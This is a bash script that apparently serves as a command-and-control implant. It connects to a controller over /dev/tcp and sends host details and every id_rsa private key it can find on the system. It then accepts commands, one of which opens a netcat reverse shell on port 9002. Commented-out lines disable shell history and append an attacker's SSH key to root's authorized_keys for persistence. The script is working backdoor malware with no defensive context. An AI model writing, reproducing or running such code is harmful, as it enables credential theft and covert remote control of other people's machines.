#!/bin/bash

#unset HISTFILE

#perms=$(id | grep uid | cut -d ' ' -f1 | cut -d '=' -f2 | cut -d '(' -f1)

#if [ $perms -eq 0 ]; then
#  mkdir -p /root/.ssh
#  echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCl0kIN33IJISIufmqpqg54D6s4J0L7XV2kep0rNzgY1S1IdE8HDef7z1ipBVuGTygGsq+x4yVnxveGshVP48YmicQHJMCIljmn6Po0RMC48qihm/9ytoEYtkKkeiTR02c6DyIcDnX3QdlSmEqPqSNRQ/XDgM7qIB/VpYtAhK/7DoE8pqdoFNBU5+JlqeWYpsMO+qkHugKA5U22wEGs8xG2XyyDtrBcw10xz+M7U8Vpt0tEadeV973tXNNNpUgYGIFEsrDEAjbMkEsUw+iQmXg37EusEFjCVjBySGH3F+EQtwin3YmxbB9HRMzOIzNnXwCFaYU5JjTNnzylUBp/XB6B"  >> /root/.ssh/authorized_keys
#else
#  continue
#fi 

while [ true ]; do

	arr[0]="127.0.0.1"
	svr=${arr[0]}

	eval 'exec 3<>/dev/tcp/$svr/9001;'
	if [[ ! "$?" -eq 0 ]] ; then
			continue
	fi

  eval 'printf "$(date)\r\n" >&3;'
	
  if [[ ! "$?" -eq 0 ]] ; then
			continue
	fi
	eval 'printf "Agent Name: $(md5sum /etc/passwd | cut -d '/' -f1)\r\n" >&3;'
	if [[ ! "$?" -eq 0 ]] ; then
		continue
	fi
  eval 'printf "public ip information: $(curl ipinfo.io 2>/dev/null; sleep 1)\r\n\n" >&3;'
  eval 'printf "ip information: $(ip a | ifconfig)\r\n\n" >&3;'
  eval 'printf "perms: $(id)\r\n\n" >&3;'  
  eval 'printf "os, kernel: $(uname -a)\r\n\n" >&3;'
  eval 'printf "ssh keys: $(find / -type f -name "id_rsa" 2>/dev/null -exec cat {} \;)\r\n\n" >&3;'
  eval 'printf "standing by for your orders:\r\nEnter help to see menu: \r\n" >&3;'

	while [ true ]; do
		eval "read msg_in <&3;"

		if [[ ! "$?" -eq 0 ]] ; then
			break
		fi

		if  [[ "$msg_in" =~ "ping" ]] ; then
			eval 'printf "succ %s\r\n" "${msg_in:5}" >&3;'
			if [[ ! "$?" -eq 0 ]] ; then
				break
			fi
			sleep 1
			eval 'printf "joined\r\n" >&3;'
			if [[ ! "$?" -eq 0 ]] ; then
				break
			fi
		elif [[ "$msg_in" =~ "help" ]] ; then
      eval 'printf "Help Menu:\r\nping --> check connection\r\nld --> dir listing\r\nhelp --> display commands\r\nusers --> see logged on users\r\nshell --> spawn remote shell\r\ntraceroute --> see path to remote machine\r\nexit --> quit session\r\n" >&3;'
    elif [[ "$msg_in" =~ "traceroute" ]] ; then
      eval 'printf "traceroute 8.8.8.8: $(traceroute 8.8.8.8 > /tmp/trace)\r\n" >&3;'
      sleep 3
      eval 'printf "getting data: $(cat /tmp/trace)\r\n" >&3;'
      rm /tmp/trace
    elif [[ "$msg_in" =~ "shell" ]]; then
      eval 'printf "Start a listener on 9002:\r\n" >&3;'
      sleep 10
      eval '$(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 127.0.0.1 9002 >/tmp/f)'
    elif [[ "$msg_in" =~ "ld" ]]; then
      eval 'printf "Dir: $(pwd)\r\n" >&3;'
      eval 'printf "Listing: $(ls -la)\r\n" >&3;'
    elif [[ "$msg_in" =~ "users" ]]; then
      eval 'printf "Logged on users: $(w)\r\n" >&3;'      



    else
      eval 'printf "That is not a valid command:\r\n" >&3;'      
		fi
	done
done

